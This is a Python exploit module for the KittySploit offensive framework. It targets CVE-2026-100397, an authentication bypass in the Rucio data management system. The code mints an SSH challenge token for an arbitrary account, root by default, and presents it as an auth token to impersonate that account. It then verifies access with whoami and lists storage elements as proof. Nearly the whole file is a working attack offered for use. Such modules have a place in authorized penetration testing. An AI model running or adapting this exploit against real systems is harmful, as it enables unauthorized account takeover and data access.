#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-100397 — Rucio SSH challenge token impersonation."""

from __future__ import annotations

import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.rucio import Rucio


class Module(Auxiliary, Http_client, Rucio):
    __info__ = {
        "name": "Rucio CVE-2026-100397 auth bypass",
        "description": (
            "Mints ssh_challenge_token for any account and uses it as X-Rucio-Auth-Token."
        ),
        "author": ["LLCForge", "KittySploit Team"],
        "cve": ["CVE-2026-100397"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-100397"],
        "tags": ["rucio", "auth-bypass", "cve-2026-100397", "auxiliary"],
        "agent": {
            "approval_required": True,
            "produces": ["auth_bypass", "sensitive_data"],
            "chain": {"suggested_followups": ["scanner/http/rucio_cve_2026_100397_detect"]},
        },
    }

    rucio_account = OptString("root", "Account to impersonate", required=True)
    challenge_token = OptString("", "Reuse captured token (skip challenge)", required=False)
    token_delay = OptInteger(1, "Seconds before whoami", required=False, advanced=True)
    probe_rses = OptBool(True, "GET /rses/ proof", required=False)

    def run(self):
        account = str(self.rucio_account or "").strip()
        token = str(self.challenge_token or "").strip() or self.rucio_ssh_challenge_token(account)
        if not token:
            print_error("No ssh challenge token returned")
            return False
        print_success(f"Challenge token: {token[:48]}...")

        junk_code, _ = self.rucio_whoami("deadbeef-not-a-token")
        print_status(f"Control junk token -> HTTP {junk_code}")

        delay = max(0, int(self.token_delay or 0))
        if delay:
            time.sleep(delay)

        code, body = self.rucio_whoami(token)
        if code != 200:
            print_error(f"whoami rejected (HTTP {code})")
            return False

        identity = body.strip().strip('"')
        print_success(f"Authenticated as {identity or account}")

        if self.probe_rses:
            rcode, rbody, _ = self.rucio_api("GET", "/rses/")
            print_status(f"GET /rses/ -> HTTP {rcode} ({len(rbody)} bytes)")

        self.set_info(severity="critical", cve="CVE-2026-100397", identity=identity or account)
        return True